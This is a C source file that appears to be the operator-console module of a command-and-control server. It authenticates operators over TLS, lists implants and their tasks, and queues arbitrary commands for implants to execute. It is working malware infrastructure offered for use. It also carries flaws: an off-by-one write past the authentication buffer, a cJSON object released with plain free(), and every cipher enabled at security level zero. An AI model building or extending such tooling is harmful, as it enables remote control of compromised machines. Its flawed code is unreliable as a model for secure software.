#include "operator.h"

#include <pthread.h>
#include <cjson/cJSON.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>


#include <openssl/evp.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/param_build.h>
#include <openssl/core_names.h> 
#include <openssl/sslerr.h>


#include "db.h"
#include "logs.h"

int autheticate(SSL *ssl) {
    char auth[1024];
    int bytes_received = SSL_read(ssl, auth, sizeof(auth));//recv(sock, auth, sizeof(auth), 0);
    if (bytes_received <= 0) {
        perror("recv failed");
        return -1;
    }
    auth[bytes_received] = '\0'; 
    cJSON *creds = cJSON_Parse(auth);

    if (creds == NULL) {
        fprintf(stderr, "Failed to parse JSON: %s\n", auth);
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *username = cJSON_GetObjectItem(creds, "username");
    

    if (username == NULL || !cJSON_IsString(username)) {
        fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
        cJSON_Delete(creds);
        return -1;
    }
    cJSON *password = cJSON_GetObjectItem(creds, "password");
    if (password == NULL || !cJSON_IsString(password)) {
        fprintf(stderr, "Missing or invalid 'Password' field in JSON\n");
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *reply = cJSON_CreateObject();
    if (reply == NULL) {
        fprintf(stderr, "Failed to create cJSON object\n");
        cJSON_Delete(creds);
        // Handle error or exit
        return -1;
    }

    if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
        cJSON_AddStringToObject(reply, "authenticated", "false");
        char *reply_ = cJSON_Print(reply);
        //send(sock, reply_, strlen(reply_), 0);
        SSL_write(ssl, reply_, strlen(reply_));
        log_message(LOG_INFO, "Operator Failed to authenticate");
        free(reply_);
        free(reply);
        cJSON_Delete(creds);
        return -1;
        
    }
    cJSON_AddStringToObject(reply, "authenticated", "true");
    char *reply_ = cJSON_Print(reply);
    //send(sock, reply_, strlen(reply_), 0);
    SSL_write(ssl, reply_, strlen(reply_));
    log_message(LOG_INFO, "Operator Authenticated Successfully");
    free(reply_);
    free(reply);

    cJSON_Delete(creds);
    return 0;
}


char *interact_with_implant(cJSON *rinfo) {
    if (!rinfo) {
        return strdup("{\"error\": \"Invalid JSON\"}");
    }

    cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
    cJSON *action = cJSON_GetObjectItem(rinfo, "action");

    if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
        return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
    }

    const char *action_value = action->valuestring;
    char *implant_id_value = implant_id->valuestring;

    char *data = malloc(MAX_INFO);
    if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");

    if (strcmp(action_value, "list-tasks") == 0) {
        snprintf(data, MAX_INFO, "%s", tasks_per_implant(implant_id_value));
    } 
    else if (strcmp(action_value, "response-task") == 0) {
        cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
        if (!task || !cJSON_IsNumber(task)) {
            free(data);
            return strdup("{\"error\": \"Invalid task_id\"}");
        }
        char *data_t = cmd_and_response(task->valueint);
        snprintf(data, MAX_INFO, "%s", data_t);
        free(data_t);

    } 
    else if (strcmp(action_value, "new-task") == 0) {
        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
        if (!command || !cJSON_IsString(command)) {
            free(data);
            return strdup("{\"error\": \"Invalid command\"}");
        }
        new_tasks(implant_id_value, command->valuestring);
        free(data);
        cJSON *tasks_added = cJSON_CreateObject();
        cJSON_AddStringToObject(tasks_added, "status", "task_added");
        data = cJSON_Print(tasks_added);
        cJSON_Delete(tasks_added);
    } 
    else {
        free(data);
        return strdup("{\"error\": \"Invalid action\"}");
    }

    return data;
}


void *operator_handler(void *Args) {
    struct operator_handler_args_t {
        SSL *ssl;
    };

    struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
    SSL *ssl = args->ssl;

    // 3 tries
    int try = 1;
    do {
        if (autheticate(ssl) == 0) {
            goto START;
        } 
        try++;
    } while (try <= 3);


    return NULL;
    
    
    // operator requesting infomartion or add new tasks
    START:
    while (1) {
        char buffer[1024];
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            //perror("recv failed");
            log_message(LOG_ERROR, "Failed to receive data from operator");
            return NULL;
        }

        buffer[bytes_received] = '\0'; 
        cJSON *requested_info = cJSON_Parse(buffer);
        if (requested_info == NULL) {
            //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
            log_message(LOG_ERROR, "Failed to parse JSON: %s", buffer);
            return NULL;
        }

        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
        if (about == NULL || !cJSON_IsString(about)) {
            //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON");
            cJSON_Delete(requested_info);
            return NULL;
        }

        if (strcmp(about->valuestring, "Implants") == 0){ // all info about implants
            char *implants = GetData("Implants");
            //send(sock, agents, strlen(agents), 0);
            SSL_write(ssl, implants, strlen(implants));
            free(implants);
        } else if (strcmp(about->valuestring, "Tasks") == 0) {
            char *tasks = GetData("Tasks");
            //send(sock, tasks, strlen(tasks), 0);
            SSL_write(ssl, tasks, strlen(tasks));
            free(tasks);
        } else if (strcmp(about->valuestring, "implant_id") == 0) {
            char *data = interact_with_implant(requested_info);
            if (data == NULL) {
                //send(sock, "ERROR", strlen("ERROR"), 0);
                //SSL_write(ssl, reply_, sizeof("ERROR"));    
                continue;
            }
            //send(sock, data, strlen(data), 0);
            SSL_write(ssl, data, strlen(data));
            free(data);
        } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
            log_message(LOG_INFO, "Operator Exiting");
            return NULL;
        }
        cJSON_Delete(requested_info);
    }
        
    log_message(LOG_INFO, "Closed connection");
    SSL_free(ssl);
    return NULL;
}


void *Operator_conn(void* args) {
    init();

    struct Args_t {
        char cert[BUFFER_SIZE];
        char key[BUFFER_SIZE];
        int port;
    };

    struct Args_t *Args = (struct Args_t*)args;

    char cert[BUFFER_SIZE];
    char key[BUFFER_SIZE];
    int OPERATOR_PORT = Args->port;

    strncpy(cert, Args->cert, BUFFER_SIZE);
    strncpy(key, Args->key, BUFFER_SIZE);

        // generate certificates if they dont exesits
    if (access(cert, F_OK) != 0 || access(key, F_OK) != 0) {
        generate_key_and_cert(cert, key);
    }
    free(args);

    struct sockaddr_in clientAddr;
    socklen_t client_len = sizeof(clientAddr);
    int serverSock;



    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == -1) {
        perror("Socket creation failed for operator console");
        sleep(60);
        return NULL;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(OPERATOR_PORT);
    serverAddr.sin_family = AF_INET;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        perror("binding failed For operator console\n");
        close(serverSock);
        sleep(60);
        return NULL;
    }

    if (listen(serverSock, SOMAXCONN) == -1) {
        perror("Listen Failed for operator console\n");
        close(serverSock);
        sleep(60);
        return NULL;
    }
    
    // openssl to socket
    const SSL_METHOD *method = TLS_server_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        sleep(60);
        return NULL;
    }
    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0");  // Allows all ciphers for debugging
       // load certificates and key
       SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM);
       SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM);
    
    
    int sock;
    while (1) {
        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
            perror("Accept failed");
            continue;
        }
        
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        // perform tls handshake
        if (SSL_accept(ssl) <= 0) {
            log_message(LOG_ERROR, "TLS Handshake failed ");
            //ERR_print_errors_fp(stderr);
            SSL_free(ssl);
            close(sock);
            continue;
        }
        // port = ntohs(clientAddr.sin_port) 
        // ip = inet_ntoa(client_addr.sin_addr)

        struct operator_handler_args_t {
            SSL *ssl;
        };

        struct operator_handler_args_t *args = malloc(sizeof(*args));
        args->ssl = ssl;

        pthread_t thread;
        if (pthread_create(&thread, NULL, operator_handler, (void*)args) < 0) {
            log_message(LOG_ERROR, "Failed to create operator thread");
            free(args);
            continue;
        }
        log_message(LOG_INFO, "Operator Console connected successfully : Remote address : [%s:%d]", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));

        // Detach thread so resources are automatically freed on exit
        pthread_detach(thread);
    }

    close(sock);
    close(serverSock);
    return NULL;

}